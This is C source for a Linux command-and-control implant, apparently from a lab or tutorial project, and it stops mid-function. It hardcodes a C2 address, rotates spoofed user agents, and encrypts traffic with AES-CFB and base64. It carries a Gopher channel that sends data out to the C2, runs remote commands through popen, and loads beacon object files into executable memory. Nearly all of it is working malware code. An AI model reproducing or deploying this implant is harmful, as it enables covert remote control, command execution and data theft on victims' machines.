#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <pwd.h>
#include <errno.h>
#include <openssl/buffer.h>
#include <openssl/rand.h>
#include <sys/mman.h>
#include <elf.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/wait.h>
#include <stdarg.h>
#include <netdb.h> 

#include "beacon.h"
#include "aes.h"
#include "cJSON.h"

#define C2              "10.10.14.57"
#define CLIENT_ID       "linux"
#define MALEABLE        "/pleasesubscribe/v1/users/"
#define USER_AGENTS_COUNT 4

const char* USER_AGENTS[USER_AGENTS_COUNT] = {
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
};

// === BUFFER GLOBAL ===
static char g_beacon_output[8192] = {0};
static size_t g_output_len = 0;

// === ESTRUCTURAS ===
struct MemoryStruct {
    char *memory;
    size_t size;
    size_t realsize;   // bytes recibidos
};

// === TRAMPOLINES ===
typedef struct {
    void* addr;
    size_t size;
} Trampoline;

// === TIPOS Y SÍMBOLOS FALTANTES ===
typedef void (*bof_func_t)(char*, int);

typedef struct {
    const char *name;
    void **ptr;
} SymbolResolver;

// === CACHE DE TRAMPOLINES ===
typedef struct {
    void* original;
    void* trampoline;
} TrampolineCache;

static TrampolineCache* g_trampoline_cache = NULL;
static size_t g_cache_count = 0;
static size_t g_cache_capacity = 0;

// Variables intermedias - SIN static para que sean visibles al BOF
void* g_printf_ptr = NULL;
void* g_strlen_ptr = NULL;
void* g_memcpy_ptr = NULL;
void* g_memset_ptr = NULL;
void* g_exit_ptr = NULL;
void* g_dlsym_ptr = NULL;
void* g_dlerror_ptr = NULL;
void* g_dlopen_ptr = NULL;
void* g_dlclose_ptr = NULL;
void* g_write_ptr = NULL;
void* g_mmap_ptr = NULL;
void* g_munmap_ptr = NULL;
void* g_BeaconPrintf_ptr = NULL;
void* g_BeaconOutput_ptr = NULL;
static Trampoline* g_trampolines = NULL;
static size_t g_trampolines_count = 0;
static size_t g_trampolines_capacity = 0;
void* g_socket_ptr = NULL;
void* g_connect_ptr = NULL;
void* g_inet_addr_ptr = NULL;
void* g_htons_ptr = NULL;
void* g_send_ptr = NULL;
void* g_recv_ptr = NULL;
void* g_close_ptr = NULL;
void* g_getaddrinfo_ptr = NULL;
void* g_freeaddrinfo_ptr = NULL;


static SymbolResolver g_external_symbols[] = {
    { "printf",      &g_printf_ptr },
    { "strlen",      &g_strlen_ptr },
    { "memcpy",      &g_memcpy_ptr },
    { "memset",      &g_memset_ptr },
    { "exit",        &g_exit_ptr },
    { "dlsym",       &g_dlsym_ptr },
    { "dlerror",     &g_dlerror_ptr },
    { "dlopen",      &g_dlopen_ptr },
    { "dlclose",     &g_dlclose_ptr },
    { "write",       &g_write_ptr },
    { "mmap",        &g_mmap_ptr },
    { "munmap",      &g_munmap_ptr },
    { "BeaconPrintf", &g_BeaconPrintf_ptr },
    { "BeaconOutput", &g_BeaconOutput_ptr },
    { "socket", &g_socket_ptr },
    { "connect", &g_connect_ptr },
    { "inet_addr", &g_inet_addr_ptr },
    { "htons", &g_htons_ptr },
    { "send", &g_send_ptr },
    { "recv", &g_recv_ptr },
    { "close", &g_close_ptr },
    { "getaddrinfo", &g_getaddrinfo_ptr },
    { "freeaddrinfo", &g_freeaddrinfo_ptr },
   
    { NULL, NULL }
};

// === DECLARACIÓN DE FUNCIONES FALTANTES ===
int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, unsigned char* argumentdata, int argumentSize);
static void __attribute__((noinline)) call_bof_isolated(bof_func_t func, char* args, uintptr_t arglen);
static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t arglen)
{
    // CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call
    // Después de 'call', RSP está desalineado 8 bytes (por el push del return address)
    // Entonces necesitamos RSP % 16 == 8 justo antes del call

    asm volatile(
        // Guardar frame pointer
        "push %%rbp\n\t"
        "mov %%rsp, %%rbp\n\t"

        // Guardar callee-saved registers
        "push %%rbx\n\t"
        "push %%r12\n\t"
        "push %%r13\n\t"
        "push %%r14\n\t"
        "push %%r15\n\t"

        // Calcular alineación
        // Ahora tenemos: push rbp (8) + 5 push (40) = 48 bytes = desalineado
        // Queremos RSP % 16 == 8 antes del call (porque call empuja 8 más)
        // Actualmente RSP % 16 == 0 (porque 48 % 16 == 0)
        // Necesitamos restar 8 para que RSP % 16 == 8
        "sub $8, %%rsp\n\t"

        // Preparar argumentos para la función BOF
        "mov %0, %%rdi\n\t"          // primer arg: char* args
        "mov %1, %%rsi\n\t"          // segundo arg: int alen

        // Limpiar AL (indica que no hay args XMM para variadics)
        "xor %%eax, %%eax\n\t"

        // CALL: esto empuja return address (8 bytes)
        // Después del call, RSP % 16 == 0 (perfecto para movaps)
        "call *%2\n\t"

        // Restaurar stack
        "add $8, %%rsp\n\t"
        "pop %%r15\n\t"
        "pop %%r14\n\t"
        "pop %%r13\n\t"
        "pop %%r12\n\t"
        "pop %%rbx\n\t"
        "pop %%rbp\n\t"
        :
        : "r"(args), "r"(arglen), "r"(func)
        : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11",
        "xmm0", "xmm1", "xmm2", "xmm3", "xmm4", "xmm5", "xmm6", "xmm7",
        "memory", "cc"
    );
}
// === BEACON API ===
void BeaconPrintf(int type, const char *fmt, ...) {
    if (g_output_len >= sizeof(g_beacon_output) - 1) return;
    va_list args;
    va_start(args, fmt);
    int written = vsnprintf(g_beacon_output + g_output_len,
                            sizeof(g_beacon_output) - g_output_len - 1,
                            fmt, args);
    va_end(args);
    if (written > 0) {
        g_output_len += (written < (int)(sizeof(g_beacon_output) - g_output_len) ? written : (int)(sizeof(g_beacon_output) - g_output_len - 1));
    }
}

void BeaconOutput(int type, const char *data, int len) {
    if (len <= 0 || !data) return;
    if (g_output_len + len >= sizeof(g_beacon_output)) {
        len = sizeof(g_beacon_output) - g_output_len - 1;
    }
    memcpy(g_beacon_output + g_output_len, data, len);
    g_output_len += len;
    g_beacon_output[g_output_len] = '\0';
}

// === CRATE TRAPOLINE ===
static void* create_trampoline(void* target) {
    if (!target) return NULL;

    size_t code_size = 12; // movabs rax, imm64; jmp rax
    void* code = mmap(NULL, code_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (code == MAP_FAILED) {
        fprintf(stderr, "[!] Trampolín: mmap falló\n");
        return NULL;
    }

    uint8_t trampoline_code[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // movabs rax, target
        0xFF, 0xE0                                                  // jmp rax
    };
    *(uint64_t*)(trampoline_code + 2) = (uint64_t)target;
    memcpy(code, trampoline_code, code_size);

    // Registrar para limpieza
    if (g_trampolines_count >= g_trampolines_capacity) {
        size_t new_cap = g_trampolines_capacity ? g_trampolines_capacity * 2 : 4;
        Trampoline* tmp = realloc(g_trampolines, new_cap * sizeof(Trampoline));
        if (!tmp) {
            munmap(code, code_size);
            return NULL;
        }
        g_trampolines = tmp;
        g_trampolines_capacity = new_cap;
    }
    g_trampolines[g_trampolines_count].addr = code;
    g_trampolines[g_trampolines_count].size = code_size;
    g_trampolines_count++;

    return code;
}
// === CLEAN TRAMPOLINE ===
static void cleanup_trampolines(void) {
    for (size_t i = 0; i < g_trampolines_count; i++) {
        munmap(g_trampolines[i].addr, g_trampolines[i].size);
    }
    free(g_trampolines);
    g_trampolines = NULL;
    g_trampolines_count = 0;
    g_trampolines_capacity = 0;

    // Limpiar cache
    free(g_trampoline_cache);
    g_trampoline_cache = NULL;
    g_cache_count = 0;
    g_cache_capacity = 0;
}

static void* get_or_create_trampoline(void* target) {
    if (!target) return NULL;

    // Buscar en cache
    for (size_t i = 0; i < g_cache_count; i++) {
        if (g_trampoline_cache[i].original == target) {
            return g_trampoline_cache[i].trampoline;
        }
    }

    // Crear nuevo
    void* tramp = create_trampoline(target);
    if (!tramp) return NULL;

    // Agregar a cache
    if (g_cache_count >= g_cache_capacity) {
        size_t new_cap = g_cache_capacity ? g_cache_capacity * 2 : 8;
        TrampolineCache* tmp = realloc(g_trampoline_cache, new_cap * sizeof(TrampolineCache));
        if (!tmp) return tramp;
        g_trampoline_cache = tmp;
        g_cache_capacity = new_cap;
    }

    g_trampoline_cache[g_cache_count].original = target;
    g_trampoline_cache[g_cache_count].trampoline = tramp;
    g_cache_count++;

    return tramp;
}

// === CURL WRITE CALLBACK ===
static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) return 0;

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size      += realsize;
    mem->realsize   = mem->size;
    mem->memory[mem->size] = 0;
    return realsize;
}

// === GOPHER REQUEST () ===
char* gopher_request(const char* host, int port, const char* selector, const char* method, const char* post_data) {
    // En Gopher, no hay método ni cuerpo: todo va en el selector
    char full_selector[2048] = {0};
    fprintf(stdout, "[DEBUG] gopher_request: %s:%d selector='%s' method='%s' post='%s'\n",
            host, port, selector, method, post_data ? post_data : "(null)");
    fflush(stdout);
    if (strcmp(method, "POST") == 0 && post_data) {
        // Simular POST: /report/<post_data>
        if (strlen(post_data) > 1800) {
            fprintf(stderr, "[!] POST data too long for Gopher selector\n");
            return NULL;
        }
        snprintf(full_selector, sizeof(full_selector), "/report/%s", post_data);
    } else {
        // GET normal
        snprintf(full_selector, sizeof(full_selector), "%s", selector ? selector : "");
    }

    // Conectar y enviar
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return NULL;

    struct hostent *he = gethostbyname(host);
    if (!he) { close(sockfd); return NULL; }

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr, he->h_addr, he->h_length);

    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sockfd); return NULL;
    }

    char req[2048];
    snprintf(req, sizeof(req), "%s\r\n", full_selector);
    send(sockfd, req, strlen(req), 0);

    // Recibir respuesta
    char buf[8192];
    char *resp = NULL;
    size_t total = 0;
    ssize_t n;
    while ((n = recv(sockfd, buf, sizeof(buf)-1, 0)) > 0) {
        buf[n] = '\0';
        char *tmp = realloc(resp, total + n + 1);
        if (!tmp) { free(resp); close(sockfd); return NULL; }
        resp = tmp;
        memcpy(resp + total, buf, n);
        total += n;
        resp[total] = '\0';
        if (total >= 5 && memcmp(resp + total - 5, "\r\n.\r\n", 5) == 0) {
            resp[total - 5] = '\0';
            break;
        }
    }
    close(sockfd);
    fprintf(stdout, "[DEBUG] gopher_request: received %zu bytes\n", total);
    fflush(stdout);    
    return resp; // ¡liberar con free()!
}

// === BASE64 ===
char* base64_encode(const unsigned char* input, int len) {
    BIO *b64, *bmem;
    BUF_MEM *bptr;
    b64 = BIO_new(BIO_f_base64());
    bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO_write(b64, input, len);
    BIO_flush(b64);
    BIO_get_mem_ptr(b64, &bptr);
    char *buf = malloc(bptr->length + 1);
    memcpy(buf, bptr->data, bptr->length);
    buf[bptr->length] = '\0';
    BIO_free_all(b64);
    return buf;
}

unsigned char* base64_decode(const char* input, int* len) {
    BIO *b64, *bmem;
    int input_len = strlen(input);
    *len = 0;
    b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    bmem = BIO_new_mem_buf(input, input_len);
    b64 = BIO_push(b64, bmem);
    unsigned char *buffer = malloc(input_len);
    if (!buffer) {
        BIO_free_all(b64);
        return NULL;
    }
    *len = BIO_read(b64, buffer, input_len);
    BIO_free_all(b64);
    if (*len <= 0) {
        free(buffer);
        return NULL;
    }
    return buffer;
}

// === AES CFB ===
unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
                                  const unsigned char* plaintext, size_t len, int* out_len) {
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);
    unsigned char* ciphertext = malloc(len);
    unsigned char iv_buf[16];
    memcpy(iv_buf, iv, 16);
    size_t i = 0;
    while (i < len) {
        unsigned char encrypted_iv[16];
        memcpy(encrypted_iv, iv_buf, 16);
        AES_ECB_encrypt(&ctx, encrypted_iv);
        size_t block_size = (len - i > 16) ? 16 : (len - i);
        for (size_t j = 0; j < block_size; j++) {
            ciphertext[i + j] = plaintext[i + j] ^ encrypted_iv[j];
        }
        if (block_size == 16) {
            memcpy(iv_buf, &ciphertext[i], 16);
        } else {
            memcpy(iv_buf, &ciphertext[i], block_size);
            memset(iv_buf + block_size, 0, 16 - block_size);
        }
        i += block_size;
    }
    *out_len = len;
    return ciphertext;
}

unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
                                  const unsigned char* ciphertext, size_t len, int* out_len) {
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);
    unsigned char* plaintext = malloc(len + 1);
    unsigned char iv_buf[16];
    memcpy(iv_buf, iv, 16);
    size_t i = 0;
    while (i < len) {
        unsigned char encrypted_iv[16];
        memcpy(encrypted_iv, iv_buf, 16);
        AES_ECB_encrypt(&ctx, encrypted_iv);
        size_t block_size = (len - i > 16) ? 16 : (len - i);
        for (size_t j = 0; j < block_size; j++) {
            plaintext[i + j] = ciphertext[i + j] ^ encrypted_iv[j];
        }
        if (block_size == 16) {
            memcpy(iv_buf, &ciphertext[i], 16);
        } else {
            memcpy(iv_buf, &ciphertext[i], block_size);
            memset(iv_buf + block_size, 0, 16 - block_size);
        }
        i += block_size;
    }
    plaintext[len] = '\0';
    *out_len = len;
    return plaintext;
}

// === EXEC CMD ===
char* exec_cmd(const char* cmd, int* out_len) {
    if (!cmd || strlen(cmd) == 0) {
        *out_len = 0;
        return strdup("[!] Empty command");
    }
    FILE* fp = popen(cmd, "r");
    if (!fp) {
        *out_len = 0;
        return strdup("[!] popen failed");
    }
    char buffer[4096];
    char *output = malloc(4096);
    if (!output) {
        pclose(fp);
        *out_len = 0;
        return strdup("[!] malloc failed");
    }
    size_t total = 0;
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        size_t len = strlen(buffer);
        if (total + len >= 4096) break;
        memcpy(output + total, buffer, len);
        total += len;
    }
    pclose(fp);
    output[total] = '\0';
    *out_len = total;
    return output;
}

// === Función auxiliar: alinear al tamaño de página ===
static size_t page_align(size_t size) {
    long page_size = sysconf(_SC_PAGESIZE);
    if (page_size <= 0) page_size = 4096;
    return (size + page_size - 1) & ~(page_size - 1);
}

int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, 
           unsigned char* argumentdata, int argumentSize) {
    // ✅ FASE 0: Init
    fprintf(stderr, "[DEBUG] Phase 0: Initializing all function pointers\n");
    
    if (g_BeaconPrintf_ptr == NULL) g_BeaconPrintf_ptr = (void*)BeaconPrintf;
    if (g_BeaconOutput_ptr == NULL) g_BeaconOutput_ptr = (void*)BeaconOutput;
    if (g_mmap_ptr == NULL) g_mmap_ptr = (void*)mmap;
    if (g_munmap_ptr == NULL) g_munmap_ptr = (void*)munmap;
    if (g_write_ptr == NULL) g_write_ptr = (void*)write;
    if (g_printf_ptr == NULL) g_printf_ptr = (void*)printf;
    if (g_memcpy_ptr == NULL) g_memcpy_ptr = (void*)memcpy;
    if (g_memset_ptr == NULL) g_memset_ptr = (void*)memset;
    if (g_strlen_ptr == NULL) g_strlen_ptr = (void*)strlen;
    if (g_socket_ptr == NULL) g_socket_ptr = (void*)socket;
    if (g_connect_ptr == NULL) g_connect_ptr = (void*)connect;
    if (g_close_ptr == NULL) g_close_ptr = (void*)close;
    if (g_getaddrinfo_ptr == NULL) g_getaddrinfo_ptr = (void*)getaddrinfo;
    if (g_freeaddrinfo_ptr == NULL) g_freeaddrinfo_ptr = (void*)freeaddrinfo;
    if (g_send_ptr == NULL) g_send_ptr = (void*)send;
    if (g_recv_ptr == NULL) g_recv_ptr = (void*)recv;
    if (g_htons_ptr == NULL) g_htons_ptr = (void*)htons;
    if (g_inet_addr_ptr == NULL) g_inet_addr_ptr = (void*)inet_addr;
    if (g_exit_ptr == NULL) g_exit_ptr = (void*)exit;
    if (g_dlsym_ptr == NULL) g_dlsym_ptr = (void*)dlsym;
    if (g_dlerror_ptr == NULL) g_dlerror_ptr = (void*)dlerror;
    if (g_dlopen_ptr == NULL) g_dlopen_ptr = (void*)dlopen;
    if (g_dlclose_ptr == NULL) g_dlclose_ptr = (void*)dlclose;
    
    // Limpiar buffer de output
    g_output_len = 0;
    g_beacon_output[0] = '\0';
    
    fprintf(stderr, "[DEBUG] All function pointers initialized:\n");
    fprintf(stderr, "  g_mmap_ptr = %p\n", g_mmap_ptr);
    fprintf(stderr, "  g_BeaconPrintf_ptr = %p\n", g_BeaconPrintf_ptr);
    fflush(stderr);
    
    // validar el ELF
    if (!elf_data || filesize < sizeof(Elf64_Ehdr)) {
        fprintf(stderr, "[!] Invalid ELF data\n");
        return -1;
    }
        
    // Inicializar símbolos del beacon PRIMERO
    if (g_BeaconPrintf_ptr == NULL) {
        g_BeaconPrintf_ptr = (void*)BeaconPrintf;
    }
    if (g_BeaconOutput_ptr == NULL) {
        g_BeaconOutput_ptr = (void*)BeaconOutput;
    }
    

    Elf64_Ehdr *ehdr = (Elf64_Ehdr*)elf_data;
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "[!] Not an ELF file\n");
        return -1;
    }

    if (ehdr->e_machine != EM_X86_64) {
        fprintf(stderr, "[!] Only x86_64 supported\n");
        return -1;
    }

    if (ehdr->e_shoff == 0 || ehdr->e_shnum == 0) {
        fprintf(stderr, "[!] No section headers\n");
        return -1;
    }

    Elf64_Shdr *shdr = (Elf64_Shdr*)(elf_data + ehdr->e_shoff);
    char *strtab = NULL;
    Elf64_Sym *symtab = NULL;

    // PRIMERO: Encontrar la tabla de símbolos y strings
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdr[i].sh_type == SHT_SYMTAB) {
            symtab = (Elf64_Sym*)(elf_data + shdr[i].sh_offset);
            if (shdr[i].sh_link < ehdr->e_shnum) {
                strtab = (char*)(elf_data + shdr[shdr[i].sh_link].sh_offset);
            }
            break;
        }
    }

    if (!symtab || !strtab) {
        fprintf(stderr, "[!] Missing symbol or string table\n");
        return -1;
    }

    // === FASE 1: Pre-resolver TODOS los símbolos externos ===
    fprintf(stderr, "[DEBUG] Phase 1: Pre-resolving all external symbols\n");

    // Calcular tamaño de la tabla de símbolos
    int sym_table_count = 0;
    for (int k = 0; k < ehdr->e_shnum; k++) {
        if (shdr[k].sh_type == SHT_SYMTAB) {
            sym_table_count = shdr[k].sh_size / sizeof(Elf64_Sym);
            break;
        }
    }

    for (int i = 0; i < ehdr->e_shnum; i++) {
        Elf64_Shdr *sh = &shdr[i];
        if (sh->sh_type != SHT_RELA) continue;

        Elf64_Rela *rela = (Elf64_Rela*)(elf_data + sh->sh_offset);
        int num_rela = sh->sh_size / sizeof(Elf64_Rela);

        for (int j = 0; j < num_rela; j++) {
            int sym_idx = ELF64_R_SYM(rela[j].r_info);
            if (sym_idx == 0 || sym_idx >= sym_table_count) continue;

            Elf64_Sym *sym = &symtab[sym_idx];
            if (sym->st_shndx != SHN_UNDEF) continue;

            char *sym_name = strtab + sym->st_name;
            if (!sym_name || sym_name[0] == '\0') continue;


            fprintf(stderr, "[DEBUG] BOF requests symbol: '%s' (type=%d, binding=%d)\n", 
                    sym_name, ELF64_ST_TYPE(sym->st_info), ELF64_ST_BIND(sym->st_info));


            void* resolved = NULL;
            for (int k = 0; g_external_symbols[k].name; k++) {
                if (strcmp(sym_name, g_external_symbols[k].name) == 0) {
                    if (*g_external_symbols[k].ptr == NULL) {
                        *g_external_symbols[k].ptr = dlsym(RTLD_DEFAULT, sym_name);
                        if (*g_external_symbols[k].ptr) {
                            fprintf(stderr, "[DEBUG] ✅ Pre-resolved: %s -> %p\n",
                                    sym_name, *g_external_symbols[k].ptr);
                        } else {
                            fprintf(stderr, "[ERROR] ❌ dlsym failed for %s: %s\n",
                                    sym_name, dlerror());
                        }
                    }
                    resolved = *g_external_symbols[k].ptr;
                    break;
                }
            }

            if (!resolved) {
                // FALLBACK para variables globales del beacon
                if (strcmp(sym_name, "g_mmap_ptr") == 0) {
                    resolved = &g_mmap_ptr;
                } else if (strcmp(sym_name, "g_munmap_ptr") == 0) {
                    resolved = &g_munmap_ptr;
                } else if (strcmp(sym_name, "g_write_ptr") == 0) {
                    resolved = &g_write_ptr;
                } else {
                    void* auto_resolved = dlsym(RTLD_DEFAULT, sym_name);
                    if (auto_resolved) {
                        fprintf(stderr, "[DEBUG] ✅ Auto-resolved (dlsym): %s -> %p\n", 
                                sym_name, auto_resolved);
                        resolved = auto_resolved;
                    } else {
                        fprintf(stderr, "[ERROR] ❌ Could NOT resolve: '%s' (dlerror: %s)\n", 
                                sym_name, dlerror());
                    }
                }
            }
        }
    }

    // === FASE 2: Mapear secciones como RW (sin EXEC) ===
    fprintf(stderr, "[DEBUG] Phase 2: Mapping sections as RW\n");

    void **sections = calloc(ehdr->e_shnum, sizeof(void*));
    size_t *aligned_sizes = calloc(ehdr->e_shnum, sizeof(size_t)); // ← Nuevo: para alineación
    if (!sections || !aligned_sizes) {
        perror("calloc");
        free(sections);
        free(aligned_sizes);
        return -1;
    }

    for (int i = 0; i < ehdr->e_shnum; i++) {
        Elf64_Shdr *sh = &shdr[i];
        if ((sh->sh_flags & SHF_ALLOC) && sh->sh_size > 0) {
            // Solo verificar límites para SHT_PROGBITS
            if (sh->sh_type == SHT_PROGBITS) {
                if (sh->sh_offset + sh->sh_size > filesize) {
                    fprintf(stderr, "[!] Section %d out of bounds\n", i);
                    continue;
                }
            }
            size_t aligned_size = page_align(sh->sh_size);
            void *addr = mmap(NULL, aligned_size,
                              PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (addr == MAP_FAILED) {
                perror("mmap");
                continue;
            }
            sections[i] = addr;
            aligned_sizes[i] = aligned_size;

            if (sh->sh_type == SHT_PROGBITS) {
                memcpy(addr, elf_data + sh->sh_offset, sh->sh_size);
            } else if (sh->sh_type == SHT_NOBITS) {
                memset(addr, 0, aligned_size);
            }
            // Otros tipos SHF_ALLOC se dejan como memoria anónima cero
        }
    }

    // === FASE 3: Aplicar relocalizaciones (en memoria RW) ===
    fprintf(stderr, "[DEBUG] Phase 3: Applying relocations\n");
    for (int i = 0; i < ehdr->e_shnum; i++) {
        Elf64_Shdr *sh = &shdr[i];
        if (sh->sh_type != SHT_RELA) continue;

        int target_sec = sh->sh_info;
        if (target_sec >= ehdr->e_shnum || !sections[target_sec]) continue;
        if (!(shdr[target_sec].sh_flags & SHF_ALLOC)) continue;

        Elf64_Rela *rela = (Elf64_Rela*)(elf_data + sh->sh_offset);
        int num_rela = sh->sh_size / sizeof(Elf64_Rela);
        void *target_addr = sections[target_sec];

        for (int j = 0; j < num_rela; j++) {
            Elf64_Rela *r = &rela[j];
            void *loc = (char*)target_addr + r->r_offset;
            int sym_idx = ELF64_R_SYM(r->r_info);
            if (sym_idx >= sym_table_count) continue;

            Elf64_Sym *sym = &symtab[sym_idx];
            char *sym_name = strtab + sym->st_name;
            void *symbol_addr = NULL;

            if (sym->st_shndx != SHN_UNDEF && sym->st_shndx < ehdr->e_shnum && sections[sym->st_shndx]) {
                symbol_addr = sections[sym->st_shndx] + sym->st_value;
            } else {
                for (int k = 0; g_external_symbols[k].name; k++) {
                    if (strcmp(sym_name, g_external_symbols[k].name) == 0) {
                        symbol_addr = *g_external_symbols[k].ptr;
                        break;
                    }
                }
            }

            if (!symbol_addr) {
                // FALLBACK: Variables globales del beacon
                if (strcmp(sym_name, "g_mmap_ptr") == 0) {
                    symbol_addr = &g_mmap_ptr;
                } else if (strcmp(sym_name, "g_munmap_ptr") == 0) {
                    symbol_addr = &g_munmap_ptr;
                } else if (strcmp(sym_name, "g_write_ptr") == 0) {
                    symbol_addr = &g_write_ptr;
                } else {
                    fprintf(stderr, "[!] Could not resolve symbol: %s\n", sym_name);
                    continue;
                }
            }

            switch (ELF64_R_TYPE(r->r_info)) {
                case R_X86_64_64:
                    *(uint64_t*)loc = (uint64_t)((uintptr_t)symbol_addr + r->r_addend);
                    break;
                case R_X86_64_32: {
                    uintptr_t value = (uintptr_t)symbol_addr + r->r_addend;
                    if (value > 0xFFFFFFFF) {
                        fprintf(stderr, "[!] R_X86_64_32 out of range\n");
                        continue;
                    }
                    *(uint32_t*)loc = (uint32_t)value;
                    break;
                }
                case 11: {  // R_X86_64_32S
                    intptr_t value = (intptr_t)symbol_addr + r->r_addend;
                    if (value < INT32_MIN || value > INT32_MAX) {
                        fprintf(stderr, "[!] R_X86_64_32S out of range: %s addr=%p value=0x%lx\n", 
                                sym_name, symbol_addr, (long)value);
                        goto cleanup;
                    }
                    *(int32_t*)loc = (int32_t)value;
                    fprintf(stderr, "[DEBUG] R_X86_64_32S: %s -> 0x%x\n", sym_name, (int32_t)value);
                    break;
                }                
                case R_X86_64_PC32:
                case R_X86_64_PLT32: {
                    int64_t offset = (int64_t)symbol_addr + r->r_addend - (int64_t)loc;

                    if (offset < INT32_MIN || offset > INT32_MAX) {
                        fprintf(stderr, "[DEBUG] Offset fuera de rango (%ld) para %s, creando trampolín\n",
                                offset, sym_name);
                        void* trampoline = get_or_create_trampoline(symbol_addr);
                        if (!trampoline) {
                            fprintf(stderr, "[!] Trampolín falló para %s\n", sym_name);
                            continue;
                        }
                        offset = (int64_t)trampoline + r->r_addend - (int64_t)loc;
                        if (offset < INT32_MIN || offset > INT32_MAX) {
                            fprintf(stderr, "[!] Trampolín fuera de rango para %s\n", sym_name);
                            continue;
                        }
                        fprintf(stderr, "[DEBUG] Trampolín reutilizado/creado en %p para %s\n", trampoline, sym_name);
                    }
                    *(uint32_t*)loc = (uint32_t)offset;
                    break;
                }
                default:
                    fprintf(stderr, "[!] Unsupported reloc: %ld for %s\n", ELF64_R_TYPE(r->r_info), sym_name);
                    break;
            }
        }
    }

    // Encontrar función 'go'
    bof_func_t entry = NULL;
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdr[i].sh_type == SHT_SYMTAB) {
            int sym_count = shdr[i].sh_size / sizeof(Elf64_Sym);
            for (int j = 0; j < sym_count; j++) {
                Elf64_Sym *sym = &symtab[j];
                if (sym->st_name == 0) continue;
                char *name = strtab + sym->st_name;
                if (strcmp(name, functionname) == 0 && sym->st_shndx != SHN_UNDEF) {
                    if (sym->st_shndx < ehdr->e_shnum && sections[sym->st_shndx]) {
                        entry = (bof_func_t)(sections[sym->st_shndx] + sym->st_value);
                        break;
                    }
                }
            }
        }
    }

    if (!entry) {
        fprintf(stderr, "[!] Entry '%s' not found\n", functionname);
        goto cleanup;
    }
    fprintf(stderr, "[DEBUG] BeaconPrintf addr: %p\n", (void*)BeaconPrintf);
    fprintf(stderr, "[DEBUG] g_BeaconPrintf_ptr: %p\n", g_BeaconPrintf_ptr);
    fflush(stderr);
    
    fprintf(stderr, "[DEBUG] Initializing function pointers for BOF\n");
    if (g_mmap_ptr == NULL) g_mmap_ptr = (void*)mmap;
    if (g_munmap_ptr == NULL) g_munmap_ptr = (void*)munmap;
    if (g_write_ptr == NULL) g_write_ptr = (void*)write;
    if (g_printf_ptr == NULL) g_printf_ptr = (void*)printf;
    if (g_memcpy_ptr == NULL) g_memcpy_ptr = (void*)memcpy;
    if (g_memset_ptr == NULL) g_memset_ptr = (void*)memset;
    if (g_strlen_ptr == NULL) g_strlen_ptr = (void*)strlen;
    if (g_socket_ptr == NULL) g_socket_ptr = (void*)socket;
    if (g_connect_ptr == NULL) g_connect_ptr = (void*)connect;
    if (g_close_ptr == NULL) g_close_ptr = (void*)close;
    
    fprintf(stderr, "[DEBUG] g_mmap_ptr = %p\n", g_mmap_ptr);
    fprintf(stderr, "[DEBUG] g_munmap_ptr = %p\n", g_munmap_ptr);
    fprintf(stderr, "[DEBUG] g_write_ptr = %p\n", g_write_ptr);
    fflush(stderr);

    // === FASE 4: Hacer la memoria ejecutable (W^X) ===
    fprintf(stderr, "[DEBUG] Phase 4: Applying PROT_EXEC (W^X)\n");
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (sections[i]) {
            if (mprotect(sections[i], aligned_sizes[i], PROT_READ | PROT_EXEC) != 0) {
                perror("mprotect");
                fprintf(stderr, "[!] Failed to set PROT_EXEC on section %d\n", i);
                goto cleanup;
            }
        }
    }

    g_output_len = 0;
    g_beacon_output[0] = '\0';
    call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);

cleanup:
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (sections[i]) {
            munmap(sections[i], aligned_sizes[i]); // ← Usar tamaño alineado
        }
    }
